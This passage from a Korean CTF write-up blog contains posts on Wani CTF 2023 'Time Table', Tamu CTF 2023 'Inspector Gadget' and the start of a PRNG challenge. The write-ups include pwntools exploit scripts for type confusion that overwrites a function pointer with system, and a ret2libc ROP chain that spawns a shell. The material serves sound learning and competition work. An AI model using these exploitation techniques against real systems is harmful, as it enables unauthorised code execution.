class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> San Diego </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 - Time Table (type confusion)</title>
      <link href="/230509-wanictf2023-8.time-table/"/>
      <url>/230509-wanictf2023-8.time-table/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><blockquote><p>Is your timetable alright?<br><code>nc timetable-pwn.wanictf.org 9008</code><br>Writer : EBeb</p></blockquote><ul><li>[33 solves &#x2F; 294 points]</li></ul><p>처음 풀어보는 Type Confusion 유형.<br>내가 아는 Type Confusion은 UAF와 결합되어 있었는데 이건 아니었다. 풀어보니 생각보다 풀만해서 놀랐다.<br>다 풀고 나서 롸업을 세 개 봤는데 똑같은 취약점을 이용했으나 익스방법이 나와 조금씩 달랐다. </p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>소스코드가 다 주어져있어서 차근차근 읽어보면 된다. 일단 문제 바이너리를 실행해보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">WELCOME TO THE TIME TABLE PROGRAM</span><br><span class="line">Enter your name : aaaa</span><br><span class="line">Enter your student id : 1</span><br><span class="line">Enter your major : 1</span><br><span class="line"></span><br><span class="line">        MON             TUE             WED             THU             FRI</span><br><span class="line">1       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">2       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">3       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">4       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">5       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line"></span><br><span class="line">1. Register Mandatory Class</span><br><span class="line">2. Register Elective Class</span><br><span class="line">3. See Class Detail</span><br><span class="line">4. Write Memo</span><br><span class="line">5. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>처음에 name, id, major를 입력하고 시간표로 보이는 것을 출력한 후, exit을 제외하고 4가지의 기능을 실행할 수 있도록 되어있다. 먼저 register와 관련된 기능을 살펴봤을 때 <code>mandatory_subject</code>와 <code>elective_subject</code> 구조체가 보였다. 그리고 4번 메뉴가 수상해 보여서 해당 함수도 함께 봤다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">register_mandatory_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mandatory_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Mandatory Class List-----\n&quot;</span>);</span><br><span class="line">  print_mandatory_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i); <span class="comment">// 음수 가능</span></span><br><span class="line">  choice = mandatory_list[i]; <span class="comment">// oob ?</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, choice.time[<span class="number">0</span>]);</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].type = MANDATORY_CLASS_CODE;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;mandatory_list[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_elective_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  elective_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Elective Class List-----\n&quot;</span>);</span><br><span class="line">  print_elective_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  choice = elective_list[i];</span><br><span class="line">  <span class="keyword">if</span> (choice.IsAvailable(&amp;user) == <span class="number">1</span>) &#123;</span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">    <span class="comment">// The type of timetable is 0 by default since it is a global value.</span></span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;elective_list[i];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can&#x27;t register this class\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>register_elective_class</code> 함수에서 <code>choice.IsAvailable(&amp;user)</code>를 실행하는 부분이 있다. <code>user</code>는 프로그램 맨 처음 나의 입력값이다. <code>elective_subject</code> 구조체 안에 함수포인터가 있음을 확인했다. (만약 이 함수포인터를 덮을 수 있다면, <code>system</code> 함수로 덮고, 인자로 들어간 나의 입력값 <code>user</code>는 <code>/bin/sh</code>를 넣어야겠다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_memo</span><span class="params">()</span> &#123;</span><br><span class="line">  comma *choice = choose_time(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;WRITE MEMO FOR THE CLASS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (choice-&gt;type == MANDATORY_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((mandatory_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice-&gt;type == ELECTIVE_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((elective_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>choice-&gt;type</code>을 기준으로 <code>memo</code>에 30글자 입력한다. 여기서 만약 Type confusion이 발생한다면 본래는 <code>mandatory_subject</code>인데 <code>elective_subject</code>으로 착각해서 <code>elective_subject</code> 구조체에 입력을 하게 될 것이다. 구조체 offset을 살펴보고 유의미한 위치에 쓰기를 할 수 있는지 생각해보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> *target[<span class="number">4</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 48~80</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 80~88</span></span><br><span class="line">&#125; mandatory_subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 48~56</span></span><br><span class="line">  <span class="type">int</span> (*IsAvailable)(student *); <span class="comment">// 56~64</span></span><br><span class="line">&#125; elective_subject;</span><br></pre></td></tr></table></figure><p>주석으로 offset을 적어놨다. <code>mandatory_subject</code> 구조체의 <code>memo</code>는 48번째에 위치한다. <code>elective_subject</code> 구조체의 48번째는 <code>*proffesor</code>이다. <code>write_memo</code> 함수에서 30바이트를 쓸 수 있었으니 뒤의 함수포인터를 덮을 수 있다.</p><p><code>elective_subject</code> 구조체를 <code>mandatory_subject</code> 구조체로 헷갈리고 <code>memo</code>를 작성하게 된다면 <code>elective_subject</code> 구조체의 함수 포인터를 덮어 <code>register_elective_class</code> 함수에서 함수 포인터를 실행시켜 흐름을 변경할 수 있을 것이다.</p><p>그 전에 libc leak을 해야하는데 leak도 Type confusion을 이용해서 할 수 있다. 반대로 Type confusion을 일으키면 된다. 구조를 print하는 기능이 있어서 leak이 가능하다.</p><p><code>mandatory_subject</code> 구조체를 <code>elective_subject</code> 구조체로 헷갈리고 <code>memo</code>를 작성하게 된다면 <code>mandatory_subject</code> 구조체에서 <code>*target[4]</code>을 덮게 된다. 여기에 <code>GOT가 저장된 주소</code>를 적고 구조를 print해주는 <code>print_mandatory_subject</code> 함수에서 <code>GOT</code>가 출력될 것이다.</p><p>하지만 난 이 방법은 사용하지 않고 함수 포인터를 덮는 과정에서 <code>_IO_2_1_stdout_</code>전까지 입력값을 주어 <code>print_elective_subject</code> 함수에서 <code>memo</code>를 출력할 때 <code>GOT</code>가 같이 출력되도록 했기 때문에 보다 편하게 <code>libc address</code>를 구할 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x405250 &lt;elective_list+112&gt;:   0x6161616161616161      0x6262626262626262</span><br><span class="line">0x405260 &lt;stdout@GLIBC_2.2.5&gt;:  0x00007faa16da05a0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>마지막으로 사실 <code>register_elective_class</code> 함수를 실행시키기 위해서는 조건이 하나 필요하다. 바로 맨 처음에 입력하는 <code>name</code>, <code>id</code>, <code>major</code>에서 <code>id</code>와 <code>major</code>가 특정 값 이상이거나 이하여야 한다는 조건이 있다. 이 조건을 가장 먼저 맞춰주어야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>name</code>에는 <code>/bin/sh</code>, <code>id</code>에는 <code>2000</code>, <code>major</code>에는 <code>100</code>을 입력</li><li><code>libc leak</code> : <code>write_memo</code>를 이용하여 <code>stdout</code> 전까지 입력 후, <code>print_elective_subject</code> 함수에서 구조 출력하여 <code>_IO_2_1_stdout_</code> 구함</li><li>함수 포인터 덮기 : <code>write_memo</code>를 이용하여 함수 포인터 offset 자리에 <code>system</code> 함수 주소 넣기</li><li>함수 포인터가 실행될 수 있도록 <code>register_elective_class</code> 실행</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;timetable-pwn.wanictf.org&#x27;</span>, <span class="number">9008</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memo</span>(<span class="params">memo</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;WRITE MEMO FOR THE CLASS\n&#x27;</span>, memo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_class</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subject를 mandatory_subject로 헷갈리게 해서</span></span><br><span class="line"><span class="comment"># memo[32]를 적을 때 함수 포인터를 넣어서</span></span><br><span class="line"><span class="comment"># elective_subject.student 함수 포인터를 수정할 수 있도록 하기</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id :&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;major :&#x27;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mandatory_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subject를 mandatory_subject로 헷갈리게 해서 </span></span><br><span class="line"><span class="comment"># mandatory_subject의 memo[32]에 적는 줄 알고</span></span><br><span class="line"><span class="comment"># elective_subject의 memo[32]에 적을 것 같음</span></span><br><span class="line"><span class="comment"># payload = p64(e.got[&#x27;printf&#x27;])  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> <span class="comment"># &#x27;b&#x27;*8이 함수포인터에 들어감</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">see_class()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># libc.address = libc_leak - libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"><span class="comment"># info(hex(libc.address))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># func pointer -&gt; system .. </span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*8</span></span><br><span class="line"><span class="comment"># system = libc.address + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">system = libc_leak -<span class="number">0x1c9a20</span></span><br><span class="line"></span><br><span class="line">payload = p64(system) * <span class="number">2</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># register_elective_class</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Do_n0t_confus3_mandatory_and_el3ctive&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> type confusion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 review</title>
      <link href="/230509-wanictf2023-0review/"/>
      <url>/230509-wanictf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><p>목요일 저녁에 ctftime에 들어갔는데 위 씨텝이 진행중이었다. </p><img src="/images/230509-wanictf2023-0review/pwnable.png" width=700/><br><p>잠깐 참여했는데 7번까지는 술술 풀렸다. 8번 문제에서 type confusion 일으켜서 원하는 함수를 실행시키는 것까지 코드 작성하는 것을 성공했다. 근데 libc address를 leak해야하는 게 떠올라서 print하는 부분을 찾아봤고, 머릿속으로 이렇게 이렇게 하면 될 것 같은데.. 까지 생각했는데,.. 집중이 잘 안되어서 잤다. 그리고 금요일에 이어서 문제 풀려고 했는데 개인적으로 스트레스 받는 일이 있어 컴퓨터가 손에 잘 안잡혀서 결국 대회시간 내에 풀지 못했다. 9번 문제는 얼핏보니 heap이라서 보지 않았다. </p><p>요즘 씨텝에 자주 참여하다 보니 내가 잘 아는 것들에 대해 롸업을 작성해야할까? 라는 필요성을 느꼈다. 블로그 하는 데에 피로감을 느끼고 싶지 않은데 롸업을 적어야 할 문제들이 많으면 조금씩 미루게 된다. angstrom 씨텝 롸업 적고나서 내 블로그 롸업을 보고 친구와 함께 시스템 해킹 시작하기로 했다는 연락을 디스코드로 받았을 땐 기뻐서 앞으로도 쉬운 문제도 롸업을 열심히 적겠다고 속으로 다짐했는데,.. ㅋㅋ^^; 물론 체력과 시간이 많다면 그러겠지만 요즘 조금 피곤하기도 해서 이 씨텝은 7번까지는 롸업을 적지 않고 8번만 적으려고 한다. (1번부터 7번까지 문제 이름이 곧 익스플로잇이다.)</p><br><img src="/images/230509-wanictf2023-0review/crypto.png" width=700/><br><p>씨텝 컨셉이 beginner, 초심자 혹은 중급자까지 모두를 아우르는 난이도를 가지고 있어서 정말 기본적인 포너블 문제 만큼 크립토도 그럴 것이라고 생각된다. 내 마음속의 크립토에 대한 사랑이 조금 싹났기 때문에.. 밀린 롸업들을 올리고 풀어봐도 좋을 듯 하다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Inspector Gadget (pwn, rop)</title>
      <link href="/230503-tamu2023-1.Inspector_Gadget-pwn/"/>
      <url>/230503-tamu2023-1.Inspector_Gadget-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Inspector Gadget gave me this binary with one goal. pwn.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[128 solves &#x2F; 339 points]</li></ul><img src="/images/230503-tamu2023-1.Inspector_Gadget-pwn/Screenshot 2023-05-03 at 17.31.43.png" width=500/><br><p>아싸! 내가 퍼블했다!!</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>문제 바이너리와 립시 파일을 제공받았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] </span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>64bit ROP의 정석 중에 정석이라고 생각한다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;inspector-gadget&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./inspector-gadget&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./inspector-gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40127b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;ret2libc_r0p_g04t3d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - PRNG (crypto, lcg)</title>
      <link href="/230503-tamu2023-10.PRNG-crypto/"/>
      <url>/230503-tamu2023-10.PRNG-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I know they say don’t roll your own crypto, but secure RNG should be easy. How hard could it be?<br>Author: anomie</p></blockquote><ul><li>[78 solves &#x2F; 441 points]</li></ul><p>이 문제 푸는데 가장 오래 걸린 것 같다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 